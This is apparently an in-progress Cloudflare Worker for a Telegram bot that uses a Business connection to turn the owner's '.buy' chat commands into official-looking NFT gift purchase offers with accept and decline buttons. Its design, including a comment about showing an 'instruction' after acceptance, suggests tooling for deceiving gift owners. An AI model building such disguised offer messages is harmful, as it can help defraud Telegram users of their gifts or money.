const ADMIN_ID = 5151757168; // Твой ID
const WEBHOOK_SECRET = "TestSecret2026"; // Придумай новый секрет для теста

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 
    const kv = env.USERS_KV; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- ОБРАБОТКА БИЗНЕС-СООБЩЕНИЙ (ИСХОДЯЩИХ ОТ ТЕБЯ) ---
      if (update.business_message) {
        const msg = update.business_message;
        const text = msg.text ? msg.text.trim() : "";
        const chatId = msg.chat.id;
        const businessId = update.business_connection_id;
        const messageId = msg.message_id;

        // Проверяем, начинается ли сообщение с ".buy"
        if (text.startsWith(".buy ")) {
            const parts = text.split(/\s+/);
            
            // Формат: .buy [ссылка] [цена] [валюта]
            if (parts.length < 4) {
                // Если формат неверный, ничего не делаем (или можно отправить ошибку)
                return new Response("OK", { status: 200 });
            }

            let linkOrGift = parts[1];
            let amount = parts[2];
            let currencyType = parts[3].toLowerCase(); // stars, gram, rub

            let currencyDisplay = "⭐ Stars";
            if (currencyType === "gram" || currencyType === "ton") { currencyDisplay = "💎 Gram"; } 
            else if (currencyType === "rub" || currencyType === "руб") { currencyDisplay = "₽ Rub"; }

            let giftLink = "";
            if (linkOrGift.includes("t.me")) {
                giftLink = linkOrGift.startsWith("http") ? linkOrGift : "https://" + linkOrGift;
            } else {
                giftLink = "https://t.me/nft/" + linkOrGift;
            }

            // Формируем текст оффера
            const offerText = `<b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyDisplay}</b>\n${giftLink}`;
            
            // Кнопки (пока тестовые, ведут на твой профиль)
            const offerMarkup = {
                inline_keyboard: [
                    [{ text: "Принять", callback_data: "test_accept" }],
                    [{ text: "Отклонить", callback_data: "test_decline" }]
                ]
            };

            // 🔥 ГЛАВНОЕ: РЕДАКТИРУЕМ СООБЩЕНИЕ ЧЕРЕЗ BUSINESS CONNECTION
            if (businessId) {
                try {
                    await callApi("editMessageText", { 
                        business_connection_id: businessId,
                        chat_id: chatId, 
                        message_id: messageId,
                        text: offerText, 
                        parse_mode: "HTML", 
                        reply_markup: offerMarkup 
                    }, BOT_TOKEN);
                } catch (e) {
                    console.error("Не удалось отредактировать сообщение:", e.message);
                }
            }
        }
      }

      // --- ОБРАБОТКА КНОПОК (ДЛЯ ТЕСТА) ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        if (cq.data === "test_accept") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
            // Здесь можно попробовать отредактировать сообщение, чтобы показать инструкцию
        } else if (cq.data === "test_decline") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер отклонен", show_alert: true }, BOT_TOKEN);
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}